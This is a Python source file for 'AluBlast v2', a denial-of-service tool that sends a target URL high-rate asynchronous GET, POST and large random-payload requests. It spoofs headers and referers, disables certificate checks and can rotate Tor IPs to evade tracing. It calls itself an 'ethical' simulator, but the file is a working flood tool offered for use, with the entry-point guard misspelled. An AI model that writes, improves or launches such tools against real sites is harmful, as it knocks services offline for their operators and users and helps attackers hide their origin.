import asyncio
import aiohttp
import random
import string
import os
import ssl
import argparse
import platform
import time
import threading
from colorama import Fore, Style, init
from stem import Signal
from stem.control import Controller
import uvloop

# Use uvloop for improved event loop performance
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Initialize colorama
init(autoreset=True)

# Banner
BANNER = f"""{Fore.GREEN}
███████╗██╗     ██╗   ██╗██╗   ██╗███████╗███████╗███╗   ██╗ ██████╗  ██████╗ ███████╗
██╔════╝██║     ██║   ██║██║   ██║██╔════╝██╔════╝████╗  ██║██╔═══██╗██╔════╝ ██╔════╝
█████╗  ██║     ██║   ██║██║   ██║█████╗  █████╗  ██╔██╗ ██║██║   ██║██║  ███╗█████╗  
██╔══╝  ██║     ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██║╚██╗██║██║   ██║██║   ██║██╔══╝  
███████╗███████╗╚██████╔╝╚██████╔╝███████╗███████╗██║ ╚████║╚██████╔╝╚██████╔╝███████╗
╚══════╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚══════╝╚══════╝

{Fore.LIGHTGREEN_EX}🔥 ALUBLAST v2 — SIMULATED BEAST MODE DDoS 🔥
💣 Created by Alvanosh Jojo | Ethical Use Only 💣
📟 Platform: {platform.system()} | Python: {platform.python_version()}"""

# Fake headers and referers for request spoofing
FAKE_HEADERS = [
    {"User-Agent": "Mozilla/5.0 Chrome/110.0", "Accept": "/"},
    {"User-Agent": "Mozilla/5.0 Safari/605.1.15", "Accept": "/"},
    {"User-Agent": "Mozilla/5.0 Firefox/119.0", "Accept": "/"},
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36", "Accept": "/"},
]

REFERERS = ["https://google.com", "https://bing.com", "https://duckduckgo.com", "https://yahoo.com"]

# Utilities
def random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_url_params():
    return "?q=" + random_string(random.randint(6, 16))

def random_headers():
    headers = random.choice(FAKE_HEADERS).copy()
    headers["Referer"] = random.choice(REFERERS)
    return headers

# Tor IP Renewal
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_tor_password')  # Change to your Tor control password
        controller.signal(Signal.NEWNYM)

# Basic attack types
async def send_get(session, url):
    try:
        full_url = url + random_url_params()
        headers = random_headers()
        async with session.get(full_url, headers=headers) as response:
            print(f"{Fore.GREEN}[GET] {full_url} --> {response.status}")
    except Exception as e:
        print(f"{Fore.RED}[GET ERROR] {e}")

async def send_post(session, url):
    try:
        headers = random_headers()
        data = {"data": random_string(64)}
        async with session.post(url, data=data, headers=headers) as response:
            print(f"{Fore.YELLOW}[POST] {url} --> {response.status}")
    except Exception as e:
        print(f"{Fore.RED}[POST ERROR] {e}")

async def advanced_attack(session, url, semaphore):
    headers = {
        'User-Agent': random_string(12),
        'X-Custom-Header': random_string(64)
    }
    data = {
        "msg": random_string(512),
        "token": random_string(128),
        "payload": os.urandom(256).hex()
    }
    try:
        async with semaphore:
            async with session.post(url, headers=headers, json=data) as response:
                status = response.status
                text = await response.text()
                print(f"[{status}] {url} - {text[:100]}")
    except Exception as e:
        print(f"[Error] {e}")

# Attack performer
async def perform_attack(url, rate, duration, method):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(limit=rate * 2, ssl=ssl_context)
    timeout = aiohttp.ClientTimeout(total=10)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        end_time = time.time() + duration
        semaphore = asyncio.Semaphore(rate)
        while time.time() < end_time:
            for _ in range(rate):
                if method == "GET":
                    tasks.append(send_get(session, url))
                elif method == "POST":
                    tasks.append(send_post(session, url))
                elif method == "ADV":
                    tasks.append(advanced_attack(session, url, semaphore))
                else:
                    tasks.append(random.choice([send_get(session, url), send_post(session, url), advanced_attack(session, url, semaphore)]))
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks.clear()

# Cross-platform info

def cross_platform_note():
    note = f"""
{Fore.LIGHTBLUE_EX}[ℹ] CROSS-PLATFORM NOTE:
{Fore.CYAN}- This tool runs on both Linux & Windows.
- Python 3.7+ required
- Install dependencies via:
    pip install aiohttp colorama stem uvloop
"""
    print(note)

# Entry point

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="AluBlast v2 - Ethical DDoS Simulator")
    parser.add_argument("-u", "--url", required=True, help="Target URL (http://example.com)")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Requests per cycle")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("-m", "--method", choices=["GET", "POST", "ADV", "MIX"], default="MIX", help="HTTP method to use")
    parser.add_argument("--tor", action='store_true', help="Use Tor and rotate IPs dynamically")
    args = parser.parse_args()

    cross_platform_note()

    print(f"{Fore.LIGHTGREEN_EX}[+] Starting attack on {args.url} with {args.method} for {args.duration}s...\n")

    if args.tor:
        print(f"{Fore.YELLOW}[Tor] Renewing Tor IP...")
        renew_tor_ip()

    try:
        asyncio.run(perform_attack(args.url, args.rate, args.duration, args.method))
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Interrupted by user.")
    finally:
        print(f"\n{Fore.LIGHTGREEN_EX}[✔] ALUBLAST Completed - YES WE DID IT! — By Alvanosh Jojo 💣")

if _name_ == "_main_":
    main()